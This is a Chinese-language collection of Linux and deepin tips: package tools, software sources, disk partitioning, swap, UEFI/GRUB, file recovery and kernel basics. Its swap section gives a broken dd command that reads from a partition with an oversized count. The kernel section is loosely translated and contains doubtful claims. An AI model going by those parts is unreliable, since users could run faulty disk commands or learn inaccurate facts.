安装玲珑包：`sudo apt install linglong-bin`，安装依赖`sudo apt install org.deepin.browser`（有异常），查看仓库地址`cat /persistent/linglong/config.json`，正确地址为https://mirror-repo-linglong.deepin.com，修改用`ll-cli repo modify https://mirror-repo-linglong.deepin.com --name repo`，出现start ll-service failed可手动`ll-service`启用。

标题：Linux命令总结
uname -m 显示机器的处理器架构；uname -r 显示正在使用的内核版本。

shutdown -h now 关闭系统；reboot 重启系统。

cd /home 进入 '/home' 目录；cd .. 返回上一级目录。

ls -a 显示隐藏文件；ls -l 显示文件和目录的详细资料。

mkdir dir1 创建一个叫做 'dir1' 的目录；rmdir dir1 删除一个叫做 'dir1' 的目录（仅空目录）。

cp file1 file2 复制一个文件；mv dir1 new_dir 重命名/移动一个目录。

find / -name file1 从 '/' 开始搜索文件和目录；whereis halt 显示一个二进制文件、源码或man的位置。

mount /dev/hda2 /mnt/hda2 挂载hda2盘；umount /dev/hda2 卸载hda2盘。

df -h 显示已经挂载的分区列表；du -sh dir1 估算目录 'dir1' 已使用的磁盘空间。

groupadd group_name 创建一个新用户组；useradd user1 创建一个新用户。

chmod ugo+rwx directory1 设置目录所有人、群组及其他人的读写执行权限；chown user1 file1 改变文件的所有人属性。

chattr +i file1 设置文件为不可变；lsattr 显示文件的特殊属性。

gzip file1 压缩文件；gunzip file1.gz 解压文件。

tar -cvf archive.tar file1 创建非压缩tarball；tar -xvf archive.tar 释放tar包。

rpm -ivh package.rpm 安装rpm包；rpm -e package_name 删除rpm包。

yum install package_name 下载并安装rpm包；yum remove package_name 删除rpm包。

dpkg -i package.deb 安装deb包；apt-get install package_name 安装deb包。

cat file1 正向查看文件内容；tac file1 反向查看文件内容。

head -2 file1 查看文件前两行；tail -2 file1 查看文件最后两行。

grep Aug /var/log/messages 在文件中查找关键词"Aug"；sed 's/stringa1/stringa2/g' example.txt 替换文件中的字符串。

dos2unix filedos.txt fileunix.txt 转换文件格式从MSDOS到UNIX；unix2dos fileunix.txt filedos.txt 转换格式从UNIX到MSDOS。

fsck /dev/hda1 检查修复hda1磁盘文件系统；mkfs /dev/hda1 在hda1分区创建文件系统。

mkswap /dev/hda3 创建swap文件系统；swapon /dev/hda3 启用swap文件系统。

ifconfig eth0 显示以太网卡配置；ifup eth0 启用eth0网络设备。

hostname 显示系统主机名；host www.example.com 解析主机名与IP。

vim 中 :q 退出编辑器；:w 保存当前修改。

标题：apt命令前端——nala
Nala相比APT的一大优势是并行下载，可一次下载多个包，每个唯一镜像最多下载16个包，理论速度快16倍，且限制每个镜像两个线程，在可用镜像间交替下载，一个失败则继续下一个。

nala fetch命令类似netselect和netselect-apt，会检查发行版是Debian还是Ubuntu，获取所有镜像后进行延迟测试和评分，选择三个最快的写入/etc/apt/sources.list.d/nala-sources.list。

nala history工作方式类似dnf命令，用唯一ID保存每个操作到/var/lib/nala/history.json，可调用nala history查看摘要，也可用nala history undo ID或redo ID操作包。

Ubuntu和Debian用户安装Nala需执行：添加源列表、获取密钥、更新并安装这几步命令。

安装Nala后，首先用nala update命令更新包数据库本地副本，之后可用nala install安装软件包，多数apt命令需sudo特权。

标题：Coredump工具使用与日志导出
安装Coredump工具：打开终端，输入命令：sudo apt install systemd-coredump。配置正确源可成功安装。

安装Coredump失败，依赖不够时，根据提示安装依赖；找不到安装包，可执行sudo apt update后安装，或添加源地址到/etc/apt/sources.list。

开启Coredump：执行ulimit -c，结果为0则未开启，执行ulimit -c unlimited开启，再次查询为unlimited则成功。

开启Coredump不顺利时，可修改/etc/profile、用户的~/.bashrc或~/.bash_profile、/etc/security/limits.conf文件，修改后需使配置生效。

获取Coredump日志：用coredumpctl或coredumpctl list查看，日志路径为/var/lib/systemd/coredump，是压缩文件需解压。

用gdb查看Coredump日志：执行coredumpctl gdb pid，打开后执行bt查看详细信息。

coredump是程序异常退出时产生的包含内存、寄存器状态等信息的文件，可用于定位问题。

ulimit -c用于设置最大的core文件大小，ulimit -c unlimited表示对生成的core文件大小不限制。

造成程序coredump的原因包括内存访问越界、多线程使用不安全函数、数据未加锁保护、非法指针、堆栈溢出等。

内存访问越界包括数组访问越界、字符串无结束符、使用不安全字符串操作函数等。

防止字符串操作越界应使用strncpy, strlcpy等函数。

非法指针导致coredump包括使用空指针、随意转换指针。

标题：deepin V23 安装Canon（佳能）打印机驱动
以佳能打印机 CANON IR 2625 型号为例子。

方法1：通过统信生态官网安装驱动，地址：https://ecology.chinauos.com/，打开网站后直接搜索“iR 2625”，找到对应的CPU架构，点击“详情”，一般都提供了安装包下载。

最近佳能官方出了新的驱动，安装上面的旧驱动，有一定几率出现如下问题：打印管理器内找到打印机了，驱动也安装了，打印测试时任务也显示打印成功，但是打印机没动静。

如果遇到上述问题，建议通过方法2直接安装佳能原厂最新驱动。

方法2：通过系统仓库安装佳能原厂最新驱动，安装命令如下：sudo apt install com.canon.ufr2。

安装过程中可能需要手动设置打印机型号，请选择打印机实际型号，如果是局域网内共享打印机，请提前获取打印机IP地址。

标题：deepin入门资源
统信UOS家庭版新手安装锦囊可参考：https://bbs.chinauos.com/post/8738

写给deepin小白的入门教程：https://bbs.deepin.org.cn/post/209755

标题：deepin知识汇总
深度易经项目地址：https://github.com/bubifengyun/deepin-bible

统信软件知识分享平台：https://faq.uniontech.com/

标题：deepin系统安装
deepin官方安装教程：https://www.deepin.org/zh/installation/

win10下Deepin双系统安装小白教程：https://bbs.deepin.org/zh/post/197659

在VMware安装deepin需启用“增强型键盘”为“必需”

标题：deepin系统引导和启动
Grub进入命令行解决方法：https://bbs.deepin.org/zh/post/210805

手动修改Grub默认启动项：https://www.yuque.com/pzm9012/ct5ume/zhpci6ez8l85tohh

标题：deepin系统内核
双内核使用说明：https://bbs.deepin.org/zh/post/216952

5条命令安装最新Linux kernel（Xanmod版）：https://bbs.deepin.org/post/240628

标题：deepin桌面环境
在Linux中创建应用图标：https://bbs.deepin.org/zh/post/225323

Deepin设置分辨率为1920x1080：https://www.jianshu.com/p/89a1bf1905d8

标题：deepin系统配置
设置/校准系统时间的2种方法：https://bbs.deepin.org/post/260998

取消鼠标滚轮按下粘贴功能：https://bbs.deepin.org/post/265518

标题：deepin应用及包管理
GUI软件包管理器可通过sudo apt install synaptic安装

删除卸载残留的应用配置：https://bbs.deepin.org/zh/post/227702

标题：deepin输入法
Deepin 20.3上使用Fcitx5的方法：https://bbs.deepin.org/post/224852

fcitx5输入法使用技巧及简约皮肤：https://bbs.deepin.org/zh/post/223743

标题：使用Deepin引导黑苹果（OC引导）
同时使用windows、苹果、deepin系统时，可修改deepin引导以引导黑苹果。

操作步骤第一步：文件管理器打开/boot，右键-以管理员身份打开。

操作步骤第二步：打开grub文件夹，备份grub.cfg，用文本编辑软件打开grub.cfg。

操作步骤第三步：找到windows引导项并复制，包括注释，粘贴到下方准备修改为黑苹果引导。

Windows引导项文本包含menuentry、insmod、search、chainloader等内容，有特定格式。

查找黑苹果安装位置：终端输入sudo fdisk -l，重点关注安装硬盘的分区，如sda1。

查找硬盘uuid：终端输入ls -al /dev/disk/by-uuid。

修改引导参数时，用黑苹果硬盘的uuid替换复制文本中Windows的uuid，共3处。

黑苹果启动文件位置：OC引导为/EFI/OC/OpenCore.efi，CLOVER可能为/EFI/CLOVER/CLOVERX64.efi。

修改名称参数时，将Windows Boot Manager相关名称替换为macOS或其他喜欢的名字。

完成修改后，在启动设置-通用中可看到修改后的引导项，也能修改默认启动项。

标题：deepin可用软件源
deepin系统源：deb https://community-packages.deepin.com/deepin/ apricot main contrib non-free，#deb-src开头的被注释未启用，是源代码仓库。

deepin nightly（不稳定版）系统源包含多个deb地址，如https://proposed-packages.deepin.com/dde-nightly/ bullseye main contrib non-free等。

deepin应用商店源：deb https://com-store-packages.uniontech.com/appstore deepin appstore，内含微信等。

星火应用商店源：deb [by-hash=force] https://sucdn.jerrywang.top /，内含星火应用商店打包的微信等。

deepin打印机驱动源：deb https://community-packages.deepin.com/printer eagle non-free。

启用i386架构命令：sudo dpkg --add-architecture i386，因很多wine应用是32位的。

软件源添加位置：/etc/apt/sources.list文件的末尾。

导入缺失公钥命令：sudo apt-get update 2>&1 | tee /tmp/apt.tmp; cat /tmp/apt.tmp | grep 'NO_PUBKEY' | awk -F'NO_PUBKEY' '{print $2}' | sort | uniq | xargs sudo apt-key adv --keyserver keyserver.ubuntu.com --recv，需反复运行至无“NO_PUBKEY”提示。

更新软件包列表命令：sudo apt update，安装软件用sudo apt install。

依赖问题可用aptitude，安装命令sudo apt install aptitude，32位软件包用sudo aptitude install 包名:i386，需注意方案是否删除软件包等。

非deepin系统添加deepin源建议“用完就注释”，启用时不进行系统升级，或直接下载依赖包安装。

新立得软件包管理器安装命令：sudo apt install synaptic，可在启动器找到并打开，选“源自”查看应用商店源软件包。

UOS家庭版软件源包含多个deb地址，如https://home-packages.chinauos.com/home plum main contrib non-free等。

标题：deepin系统配置与技巧汇总
Super+S切换工作区，Super键就是WIN键。该快捷键最初由Ubuntu引入，Deepin的工作区仅横向排列一行，缺少多行自适应。

Super+W显示当前工作区窗口；Super+A显示所有工作区窗口；Super启动器；Super+D显示桌面；Super+E打开文件管理器；Super+L锁屏。

Deepin启动器搜索支持拼音，打开启动器后输入“xk”会显示“显卡驱动管理器”，支持简拼、全拼和模糊匹配。

在控制中心-鼠标中打开“自然滚动”选项，可让笔记本触控板双指滚动体验与手机、macOS、Win10一致。

Chrome可右键标题栏去掉“使用系统标题栏和边框”；VSCode在“文件-首选项-设置-窗口-Title Bar Style”选“custom”，以使用自定义标题栏。

从应用商店安装Timeshift制作系统快照，位置选/和/home外分区，用户建议包含当前用户隐藏文件，筛选列表排除在前添加在后，首次快照耗时久，后续用软链接提速。

APT命令：apt search查找软件；sudo apt install --reinstall重新安装；sudo apt install -f安装并修复依赖；sudo apt purge卸载并清配置；apt list看版本；apt list --installed列所有已安装软件。

which 命令可查命令路径，如which deepin-editor输出/usr/bin/deepin-editor；dpkg -S 路径可查所属软件包，如dpkg -S /usr/bin/deepin-editor显示所属deepin-editor。

系统假死或黑屏时，按Ctrl+Alt+SysRq+B（SysRq即Print Screen键）可安全重启，有Fn键可能需同时按，Alt+SysRq+B也有效。

更换主机名：sudo deepin-editor /etc/hostname，替换新主机名后重启电脑。

进程命令：pgrep XXX查进程ID；ps -ef |grep XXX显进程及命令行；pkill XXX杀掉进程；killall XXX全杀；sudo netstat -tulpn | grep :21查端口。

制作USB启动盘命令：sudo dd if=/path/to/iso of=/path/to/USB，加status=progress显示进度。

Live模式修复GRUB引导：终端执行sudo -i && fdisk -l找sdaX，再mount /dev/sdaX /mnt等绑定目录，chroot /mnt后update-grub、grub-install /dev/sda。

运行Windows绿色软件：进入目录右键“在终端中打开”，执行deepin-wine 软件.exe。大型软件建议用独立容器，如拷贝容器后用WINEPREFIX安装。

硬盘克隆：推荐Clonezilla，dd命令备用，备份用sudo dd if=/dev/sda1 of=~/elf.bak status=progress，还原则交换if和of，可压缩备份与还原。

备份MBR：sudo dd if=/dev/sdX of=/path/to/mbr bs=512 count=1；还原MBR：sudo dd if=/path/to/mbr of=/dev/sdX bs=512 count=1；备份分区表用sudo sfdisk -d /dev/sdX > /path/to/fqb。

开机画面卡死或黑屏，在grub引导菜单按e编辑，在“splash quiet”后加acpi_osi=! acpi="windows 2009"，F10启动，也可试nomodeset或nouveau.modeset=0。

关闭错误报警蜂鸣：临时用sudo rmmod pcspkr；永久可在~/.profile加相关内容，或在/etc/modprobe.d/blacklist.conf加blacklist pcspkr。

测试显卡性能：终端执行vblank_mode=0 glxgears，FPS达3000以上说明驱动正常，NVIDIA闭源驱动需在配置程序取消垂直同步。

标题：find命令查找技巧
find命令格式一般分三部分：find命令、要搜索的路径（可多个）、表达式。表达式是核心，包括Tests、Actions、Global options、Positional options。

Tests是指定查找文件的条件，涉及文件属性。参数中数字n的三种写法：+n（大于n）、-n（小于n）、n（等于n）。

根据时间查找的参数：-mtime（修改时间，天）、-ctime（change time，天）、-atime（access time，天）、-mmin（修改时间，分钟）、-amin（access time，分钟）、-cmin（change time，分钟）。还可通过对比文件时间，如-anewer（access time较新）等。

根据用户查找的参数：-uid（uid为n）、-user（所属用户为name）、-gid（gid为n）、-group（所属组为name）、-nogroup（无所属组）、-nouser（无所属用户）。

根据权限查找：-executable（可执行）、-readable（可读）、-writable（可写）、-perm mode（权限为mode，支持数字或ugo=rwx格式，mode前可加/或-）。

根据路径查找：-name（文件名匹配pattern）、-iname（忽略大小写的name）、-lname（符号连接文件名匹配）、-ilname（忽略大小写的lname）、-path（完整路径匹配）、-ipath（忽略大小写的path）、-regex（正则匹配文件名）、-iregex（忽略大小写的regex）。

其他状态查找：-empty（空文件或目录）、-size n[cwbkMG]（指定文件长度，n可加+-）、-inum（inode编号）、-links n（连接数）、-samefile name（硬连接文件）、-type c（文件类型，如d为目录、f为普通文件等）。

Actions参数对找到的文件操作：-ls（长格式显示）、-fls file（写入文件）、-print（默认显示）、-print0（null分割显示）、-fprint file（写入文件）、-fprint0 file（null分割写入）、-delete（删除）、-printf（格式化输出）、-prune（不进入目录）、-quit（找到后退出）。

find执行命令：-exec（在起始目录执行，格式-exec command ; 或-exec command {} +）、-execdir（在文件所在目录执行，格式类似）、-ok（执行前确认，类似exec）、-okdir（执行前确认，类似execdir）。;需转义，{}代表文件名。

Operators连接表达式：-a/-and（逻辑与）、-o/-or（逻辑或）、!/-not（取非）、( expr )（确定优先级）。默认多个表达式为逻辑与。

find其他常用参数：-depth（先操作目录内文件再操作目录）、-maxdepth（最大目录深度）、-mindepth（最小目录深度）。

标题：Flash网页游戏
在deepin系统中安装flash插件可通过终端执行命令：sudo apt install browser-plugin-freshplayer-pepperflash。

在deepin系统中，可安装firefox-esr浏览器来支持flash，安装命令为sudo apt install firefox-esr。

赛尔号的swf文件地址是https://seer.61.com/Client.swf。

功夫派的swf文件地址是http://gf.61.com/Client.swf。

4399很多flash页游直接打开会提示下载指定浏览器，需直接访问swf的url地址进行游戏，可按F12在开发者模式搜索.swf查找。

打开终端的快捷键是Ctrl Alt T。

标题：grep详解
grep全拼为Global search REgular expression and Print out the line，是文本搜索工具，根据用户指定的“模式”对目标文本逐行匹配检查，打印匹配到的行。

模式是由正则表达式的元字符及文本字符编写的过滤条件，grep的匹配模式可以是普通文字符号或正则表达式。

使用grep -i可不区分大小写，-n可显示匹配行和行号，可用于输出以I开头的行。

输出以.结尾的行时，.需用\转义，因.在正则中有特殊含义，代表匹配任意一个字符。

Linux平台下所有文件的结尾都有$符，可用cat -A查看文件，^$组合符代表空行。

“.”点表示任意一个字符，有且只有一个，不包含空行；“*”表示找出前一个字符0次或一次以上。

“.*”组合符表示所有内容，包括空行；^.*t符含义为以任意内容开头，直到t结束。

[abc]中括号表达式表示匹配中括号中任意一个字符，a或b或c；[a-z]匹配所有小写单个字母，[A-Z]匹配所有单个大写字母，[a-zA-Z]匹配所有的单个大小写字母，[0-9]匹配所有单个数字，[a-zA-Z0-9]匹配所有数字和字母。

grep的-o选项可只显示被匹配到的关键字，-c只统计匹配的行数。

[^abc]或[^a-c]中，^在中括号第一位表示排除，即排除字符a、b、c。

扩展正则表达式使用grep -E实践，egrep已弃用；+号表示匹配前一个字符1次或多次，需用grep -E。

?符匹配前一个字符0次或1次；竖线|在正则中是或者的意思；小括号()将一个或多个字符捆绑在一起当作整体处理。

{n,m}匹配前一个字符至少n次，最多m次；{n,}匹配前一个字符至少n次，无上限；{,m}匹配前一个字符最多m次，可以没有。

标题：Linux 下恢复误删文件
本文来自论坛用户littlebat在论坛中的分享《Linux 下恢复误删文件》，首发于学习日记。

客户在 Ubuntu Linux（约20.04）下用 rm 命令误删重要文件夹文件，后在同分区装数据恢复软件恢复失败，找人恢复不理想后再联系作者。

恢复时先长按电源键关电脑，用向日葵远程到Windows系统制作Ubuntu的U盘Live系统，从U盘启动后安装向日葵远程操作，操作时未挂载硬盘分区。

用lsblk -f查看磁盘分区，客户有单独的/home分区，格式ext4，被删文件位于家目录文件夹，假设分区是/dev/sda3。

在Live系统安装testdisk和ext4magic，执行sudo testdisk /dev/sda验证删除数据位置和时间，退出后挂载另一个分区存储恢复数据，假设为/dev/sda1，切换到/mnt/tmp执行恢复命令。

恢复命令为sudo ext4magic /dev/sda3 -a "$(date -d "2022-09-25 15:00:00" +%s)" -r，恢复2022年9月25日15点后删除的文件，文件保存在RECOVERDIR中，原路径找不到，有效文件在RECOVERDIR/MAGIC-2下，无原目录结构和文件名。

恢复的python文件在RECOVERDIR/MAGIC-2/text/x-script.python，.rmf文件在RECOVERDIR/MAGIC-2/application/octet-stream，通过文件内容关键字寻找，如python文件引用“specialpackage”，.rmf文件有“mykeyinhead”。

数据恢复结果：在有错误数据覆盖操作下，找回很多python文件和一些rmf文件，客户基本满意。

数据误删恢复小结1：重要数据要在不同介质备份。

小结2：误删数据后不要往相同分区作写入操作，可直接卸载的分区直接卸载，有自动写入的分区建议长按电源键关电脑。

小结3：可直接卸载的分区可在电脑上装恢复软件恢复；系统启动后会写操作的分区用Live Linux启动恢复。

小结4：尝试用photorec恢复，其根据文件类型特征逐扇区扫描，可指定特定类型文件，因移动硬盘IO错误中断，且ext4magic效果达预期而放弃。

小结5：新版本操作系统（如Ubuntu 20.04）的ext4文件系统中，通过文件系统日志恢复删除文件不能保留原文件名，旧版本（如Ubuntu 16.04）可以，测试多种软件效果相同，extundelete不工作。

参考资料包括Unix/Linux undelete/recover deleted files、File recovery、Ext4magic、TestDisk、PhotoRec的相关链接。

标题：Linux 磁盘分区和挂载
Linux 来说无论有几个分区，分给哪一目录使用，它归根结底只有一个根目录，一个独立且唯一的文件结构，Linux 中每个分区都是用来组成整个文件系统的一部分。Linux 采用了一种叫 '载入' 的处理方法，它的整个文件系统中包含了一整套的文件和目录，且将一个分区和一个目录联系起来，这是要载入的一个分区将使它的存储空间在一个目录下获得。

Linux硬盘分IDE硬盘和SCSI硬盘，目前基本上是SCSI硬盘。对于IDE硬盘，驱动器标识符为'hdx~'，其中'hd'表明分区所在设备的类型，'x'为盘号（a为基本盘，b为基本从属盘，c为辅助主盘，d为辅助从属盘），'~'代表分区，前四个分区用数字1到4表示（主分区或扩展分区），从5开始是逻辑分区。对于SCSI硬盘则标识为'sdx~'，用'sd'表示设备类型，其余与IDE硬盘表示方法一致。

在Linux中查看所有设备挂载情况的指令为lsblk或者lsblk -f。示例中[root@kongchao03 ~]# lsblk的输出里，sda1、sda2、sda3分别代表第一块硬盘的第一分区、第二分区、第三分区。

Linux虚拟机中新增一块硬盘的操作：在虚拟机菜单的设置中增加一块硬盘，完成后需重启虚拟机才能生效识别，生效后可使用lsblk命令查看新增的硬盘。

对Linux虚拟机中新增的sdb硬盘进行分区的指令是fdisk /dev/sdb。fdisk命令的常用操作：m显示命令列表、p显示磁盘分区（同fdisk -l）、n新增分区、d删除分区、w写入并退出、q不保存退出。

使用fdisk /dev/sdb新增主分区的步骤：输入n（新增分区），选择p（分区类型为主分区），默认分区号（1-4），默认起始扇区和最后扇区（使用剩余全部空间），最后输入w（写入分区并退出）；若不保存退出则输入q。

Linux中对分区进行格式化的指令为mkfs -t ext4 /dev/sdb1，其中ext4是分区类型；分区格式化后会分配UUID，可通过lsblk -f命令查看。

Linux中mount挂载的语法为mount 设备名称 挂载目录（挂载目录可任意）。示例：先在根目录下创建newdisk目录（mkdir /newdisk），再执行mount /dev/sdb1 /newdisk将/dev/sdb1挂载到/newdisk；进入/newdisk目录创建文件，实际是在/dev/sdb1分区上新建文件。

Linux中umount取消挂载的语法为umount 挂载点或umount 设备名，示例：umount /dev/sdb1；通过命令行执行mount挂载（如mount /dev/sdb1 /newdisk），重启虚拟机后挂载点会消失。

Linux中实现分区永久挂载（重启不消失）的方法：通过修改/etc/fstab文件实现；修改完成后，执行mount -a或reboot命令即可生效。查询磁盘使用情况的指令为df -h。

Linux中查询指定目录磁盘占用情况的基础指令为du [参数] /目录（默认为当前目录）。du命令的常用参数：-s指定目录占用大小汇总、-h带计量单位、-a含文件、--max-depth=1限制子目录深度、-c列出明细并增加汇总值。

Linux中du命令参数联合使用的示例：查询/opt目录磁盘占用情况（子目录深度为1）的命令为du -h --max-depth=1 /opt；查询/opt目录（深度1）并含文件、带单位、显示汇总的命令为du -hac --max-depth=1 /opt。

Linux分区原理：无论有几个分区，都只有一个根目录和独立的文件结构。每个分区组成整个文件系统，采用"载入"方式将分区与目录关联，使分区存储空间在目录下生效。

硬盘标识规则：IDE硬盘标记为"hdx~"，其中hd表示设备类型，x为盘号（a=基本盘,b=基本从属盘,c=辅助主盘,d=辅助从属盘），~为分区号（1-4表示主分区/扩展分区，5+为逻辑分区）。SCSI硬盘标记为"sdx~"，规则同IDE但前缀为sd。

磁盘查询工具：df -h查看磁盘使用情况，du -h --max-depth=1 /opt可查指定目录的磁盘占用。参数-s汇总大小，-a包含文件，-c增加汇总值。

标题：linux-swap交换分区详解
交换分区主要是在内存不够用的时候，将部分内存上的数据交换到swap空间上，避免系统因内存不足出现oom或更致命情况。当内存使用有压力，触发内存回收时，可能会使用swap空间。

/proc/sys/vm/swappiness文件用于调整与swap相关的参数，默认值60，取值范围0-100。值越高，内核使用swap越积极；值越低，使用积极性越低。0表示内存在free和file-backed使用的页面总量小于高水位标记前不交换，尽量清缓存回收内存；100表示回收时从cache回收和swap交换优先级一样。

修改swappiness值可临时用sysctl vm.swappiness=值，持久化需编辑/etc/sysctl.conf，添加vm.swappiness=值，重启生效。

swap操作在kswapd周期检查和直接内存回收两种机制下进行。申请内存大于剩余内存触发直接回收。kswapd周期检测内存，当达到low阈值开始回收，回收到剩余内存达high阈值为止。可通过cat /proc/zoneinfo查看内存水位标记。

swap分区优先级可用-p参数指定，值越大优先级越高，范围-1到32767。可通过swapoff /dev/sdc1; swapon -p 0 /dev/sdc1修改，在/etc/fstab添加条目/dev/sdc1 swap swap pri=0 0 0可使重启生效。

启停swap可使用swapoff -a停止，swapon -a启动。

创建swap空间：制作swap文件用dd if=/dev/sda3 of=./swapfile bs=1M count=1G和mkswap ./swapfile，启用用swapon swapfile，关闭用swapoff swapfile。

标题：Linux&Windows双系统时间不一致解决方案
Windows直接把CMOS时间认定为当前显示时间，不根据时区转换，调整时区会修改CMOS时间。

Linux以CMOS时间为格林威治标准时间，根据系统时区确定显示时间，如时区为GMT+08:00、CMOS时间03:00时，显示时间为11:00。

解决双系统时间不一致有两个办法：让Windows启用UTC；让Ubuntu禁用UTC，推荐第二种。

Windows下启用UTC：Win+R打开运行，输入regedit启动注册表编辑器，找到HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/TimeZoneInformation/，添加REG_DWORD类型键值RealTimeIsUniversal，值为1，重启生效。

Ubuntu下关闭UTC：Ctrl+Alt+T调出终端，输入sudo vim /etc/default/rcS，找到UTC=yes改成UTC=no，保存即生效。

推荐在Linux下打开终端，输入timedatectl set-local-rtc 1，再输入timedatectl解决时间问题。

标题：Linux下UEFI引导相关知识
CSM是UEFI的兼容性支持模块，用于兼容老BIOS，应关闭，否则可能出现问题。

UEFI相比BIOS的关键改进：无512字节引导扇区限制，无MBR的4个分区及活动分区限制，可从不限大小的文件启动。

UEFI启动步骤：1.主板读取设备引导文件；2.若无，读取bootx64.efi；3.若无，通过网络读取PXE服务器引导；4.若无，启动efi shell（若有）。

Windows支持UEFI的版本从Win7开始，且需选择64位版本。

bcdboot.exe可设定主板引导菜单，复制引导文件到ESP引导区，是推荐工具。

转换磁盘为GPT格式可使用diskpart工具：进入diskpart，list disk选中目标磁盘，执行convert gpt。

ESP分区是存放引导文件的专门分区，格式为fat格式，供UEFI识别引导文件。

bcdboot命令基本格式：bcdboot 系统 /l 语言 /s esp分区 /f UEFI，可复制引导文件并配置。

Linux安装时需设置UEFI启动，关闭CSM和安全启动，磁盘分区表为GPT格式。

UEFI shell的常用命令：ls列出文件、cd进入目录、help查看帮助、reset重启系统。

GRUB的主文件夹包括/boot/grub/、/etc/grub.d/、/etc/default/grub/等。

grub-install命令用于安装GRUB，--target参数可指定镜像类型，如x86_64-efi。

update-grub实际是调用grub-mkconfig更新/boot/grub/grub.cfg配置文件。

UEFI引导Windows的关键文件：bootmgfw.efi（核心引导程序）、bcd（引导菜单文件）。

BOOTICE是一款bcd菜单编辑工具，版本1.3.4 x64可修改主板引导菜单。

标题：Linux下如何做到一个文件即可读写又只读
Linux运维中，目录或磁盘满且无法扩容时，常用软链接解决，但其有多层后易晕、易误操作的弊端。

mount --bind可重新挂载文件目录结构，连接两个目录，将前一个目录挂载到后一个目录，对后一个目录的访问实际是对前一个的访问。

mount --bind test1 test2执行后，Linux屏蔽test2的目录项，内核将test1的目录项记录在内存s_root对象，VFS创建含mount信息的vfsmount对象，其为HASH对应表，含/test1与/test2的对应关系。

访问/test2下的文件时，系统告知/test2目录项被屏蔽，自动转至VFS，通过vfsmount了解对应关系，读取/test1的inode，故/test2下读到的是/test1的文件。

两个目录的挂载关系存在于内存中，重启后消失，需写入/etc/fstab中。

mount --bind可用于临时配置文件读取测试：在/tmp等目录写测试配置文件，挂载到配置文件读取目录，程序读取临时文件，测试后umount不影响原配置。

mount --bind的只读挂载：通过mount --bind,ro挂载只读目录，原目录可写，挂载出的目录只读，可将只读目录权限给开发人员查看配置，不允许修改。

标题：linux下解压rar文件
linux中无法用本身命令解压rar文件，需安装rar压缩软件，且需切换为root账户安装，否则出错。

下载linux版本的rar软件需访问官网https://www.rarlab.com/download.htm，可通过getconf LONG_BIT查看服务器字长以选择合适版本。

解压下载的rar软件，需先cd进入存放文件夹，再执行命令tar -xzpvf rarlinux-x64-612.tar.gz。

解压后会出现rar文件夹，cd进入该文件夹，用make命令安装，非root账户执行make会出错，访问被拒绝。

解压rar文件需cd进入其所在文件夹，再执行命令rar x XXX.rar。

标题：Linux之apt与dpkg安装包管理工具的区别
apt与dpkg均为ubuntu的包管理工具。dpkg侧重本地软件管理，apt基于dpkg，侧重重于远程包的下载和依赖管理，是dpkg的前端。

dpkg仅用于安装本地软件包，安装时不安装依赖包，不解决依赖问题，命令为sudo dpkg -i <package_name>.deb。

apt默认从远程仓库搜索包、下载并安装，会自动安装依赖包并解决依赖问题，命令为sudo apt install <package_name>。

apt从本地安装需在包名前指定路径，命令为sudo apt install <path>/<package_name>.deb。

dpkg查看指定包的版本、架构和描述信息的命令为dpkg -l <package_name>或dpkg --list <package_name>。

dpkg列出所有已安装的包及其版本、架构和描述信息的命令为dpkg -l，相当于apt list --installed。

dpkg查看包的安装路径的命令为dpkg -L <package_name>。

dpkg查看包是否安装的命令为dpkg -s <package_name>或dpkg --status <package_name>。

apt更新包信息的命令为sudo apt update。

apt根据包信息升级包的命令为sudo apt upgrade。

apt删除不再需要的依赖包的命令为sudo apt autoremove。

标题：Linux内核概念和学习路线
内核是与计算机硬件接口的易替换软件的最低级别。它负责将所有以“用户模式”运行的应用程序连接到物理硬件，并允许称为服务器的进程使用进程间通信(IPC)彼此获取信息。

微内核只管理它必须管理的东西:CPU、内存和IPC。计算机中几乎所有的东西都可以被看作是一个附件，并且可以在用户模式下处理。

微内核具有可移植性的优势，因为只要操作系统仍然试图以相同的方式访问硬件，就不必担心您是否更改了视频卡，甚至是操作系统。微内核对内存和安装空间的占用也非常小，而且它们往往更安全，因为只有特定的进程在用户模式下运行，而用户模式不具有管理员模式的高权限。

微内核的缺点：通过驱动程序，硬件更加抽象；硬件可能反应较慢，因为驱动程序处于用户模式；进程必须在队列中等待才能获得信息；进程不能在不等待的情况下访问其他进程。

单内核不仅包含CPU、内存和IPC，而且还包含设备驱动程序、文件系统管理和系统服务器调用等内容。

单内核的优点：更直接地访问程序的硬件；流程之间更容易通信；如果支持您的设备，它应该不需要额外安装就可以工作；进程反应更快，因为没有等待处理器时间的队列。

单内核的缺点：较大安装体积；较大内存占用；不太安全，因为所有操作都在管理模式下运行。

混合内核能够选择在用户模式下运行什么，以及在管理模式下运行什么。通常情况下，设备驱动程序和文件系统I/O将在用户模式下运行，而IPC和服务器调用将保持在管理器模式下。

混合内核的优点：开发人员可以选择什么在用户模式下运行，什么在管理模式下运行；比单片内核更小的安装占用空间；比其他型号更灵活。

混合内核的缺点：会遭受与微内核相同的进程延迟；设备驱动程序需要由用户管理(通常)。

Ubuntu中的内核文件存储在/boot文件夹中，称为vmlinux -version。

vmlinuz这个名字来自于unix世界，早在60年代，他们就把内核简单地称为“unix”，所以当内核在90年代首次开发时，Linux就开始把内核称为“Linux”。当开发虚拟内存以便更容易地进行多任务处理时，将“vm”放在文件的前面，以显示内核支持虚拟内存。有一段时间，Linux内核被称为vmlinux，但是内核变得太大，无法装入可用的引导内存，因此压缩了内核映像，并将末尾的x更改为z，以显示它是用zlib压缩的。

在/boot文件夹中还有其他非常重要的文件，称为initrd.img-version、system.map-version, config-version。initrd文件用作一个小RAM磁盘，用于提取和执行实际的内核文件。这个系统。map文件用于内核完全加载之前的内存管理，配置文件告诉内核在编译内核映像时要加载哪些选项和模块。

因为Linux内核是单片的，所以它比其他类型的内核占用空间最大，复杂度也最高。

Linux内核开发人员使内核模块可以在运行时加载和卸载，这意味着您可以动态地添加或删除内核的特性。

内核模块，也称为可加载内核模块(LKM)，对于保持内核在不消耗所有可用内存的情况下与所有硬件一起工作是必不可少的。模块通常向基本内核添加设备、文件系统和系统调用等功能。lkm的文件扩展名是.ko，通常存储在/lib/modules目录中。

可以通过在启动时使用menuconfig命令将模块设置为load或not load，或者通过编辑/boot/config文件，或者使用modprobe命令动态地加载和卸载模块，轻松定制内核。

标题：Linux基础知识点总结
操作系统简称OS，是硬件基础上的第一层软件，是硬件和其它软件沟通的桥梁，控制其他程序运行，管理系统资源，提供基本计算功能和服务程序。

